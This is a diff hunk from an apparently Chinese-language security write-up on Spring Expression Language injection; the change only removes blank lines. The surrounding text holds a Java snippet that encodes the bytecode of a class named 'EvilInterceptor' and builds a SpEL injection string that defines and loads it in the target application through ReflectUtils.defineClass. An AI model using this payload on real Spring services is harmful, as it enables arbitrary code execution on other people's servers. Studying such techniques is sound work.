@@ -171,18 +171,12 @@ System.out.println(cmd);
 
 `java.lang.ClassLoader#defineClass`不是公开方法，无法被其他模块访问
 
-
-
 ```java
 byte[] bytes = ClassPool.getDefault().get("org.springframework.expression.EvilInterceptor").toBytecode();
 String s = Base64.getEncoder().encodeToString(bytes);
 String cmd = "T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.EvilInterceptor',T(java.util.Base64).getDecoder().decode('" + s + "'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))";
 System.out.println(cmd);
 ```
-
-
-
-
 
 # 0x04 CVE To Study
 
